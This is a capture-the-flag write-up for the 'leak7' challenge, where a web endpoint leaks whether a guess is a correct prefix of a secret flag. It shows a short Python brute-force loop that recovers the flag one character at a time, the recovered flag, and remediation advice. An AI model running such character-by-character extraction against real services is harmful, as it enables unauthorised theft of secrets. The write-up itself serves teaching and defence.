# leak7 - Boolean prefix oracle

| | |
|---|---|
| **Challenge** | leak7 |
| **Category** | INFOLEAK |
| **Points / Difficulty** | 300 / hard |
| **Target** | http://leak7.chal.deti:8016 ("Oracle") |
| **Leak class** | Information oracle - secret reconstructed one char at a time |

## Hint
> The endpoint answers yes/no to one question. Script the conversation.
> It only says yes one letter, then another - write what it told you.

## Recon
`GET /oracle?prefix=<s>` behaves as a **prefix oracle**:
- `prefix=` (empty) -> `yes`
- `prefix=f` -> `yes`, `prefix=flag{` -> `yes`  (correct leading substrings)
- `prefix=zzz` -> **403 Forbidden** (wrong prefix)

So the signal is: body `yes` / HTTP 200 = "this is a correct prefix of the secret",
anything else (403) = "no". That's enough to recover the secret character by character.

## Approach
Maintain a known-good prefix (start empty). For each position, try appending each
candidate character; the one that still returns `yes` is the next real character.
Repeat until the prefix ends in `}`.

## Exploitation - the client
`oracle.py` (python3 + requests). Core loop:
```python
CHARSET = string.ascii_letters + string.digits + "_{}-"
flag = ""
while not flag.endswith("}"):
    for c in CHARSET:
        if is_prefix(flag + c):   # GET /oracle?prefix=flag+c ; 200 and body=='yes'
            flag += c; break
    else:
        break                     # no char matched -> charset incomplete
```

## Result
```
flag{362222c46da1da7be78d73449397c1f6}
total requests = 1457
```

## Flag
```
flag{362222c46da1da7be78d73449397c1f6}
```

## Task questions
- **How many requests?** 1457. The flag is 38 chars; with a 67-char charset that is
  ~1457 ≈ sum over positions of (index of the correct char). A tighter charset makes
  it cheaper (see below).
- **Character set assumed?** `[A-Za-z0-9_{}-]` (67 chars) - covers both hex flags and
  the "wordy" flags this CTF uses (e.g. `g1t_h1story_l34ks`).
- **How verified?** The `for/else` guard never triggered - every position found
  exactly one matching character - so the charset was complete for this secret. In
  hindsight the body is `flag{` + 32 lowercase-hex + `}`, so restricting the inner
  charset to `0-9a-f` would cut requests by ~4x; the broad set was a safe default.

## Root cause & remediation
- **Cause:** an endpoint that discloses whether a guess is a correct prefix of a secret
  leaks the secret over many queries (same class as a timing/blind-injection oracle).
- **Fix:** never expose prefix/partial-match checks on secret material; compare whole
  values in constant time server-side and return a single pass/fail only after full
  authentication; rate-limit and lock out repeated probing so char-by-char extraction
  is infeasible.
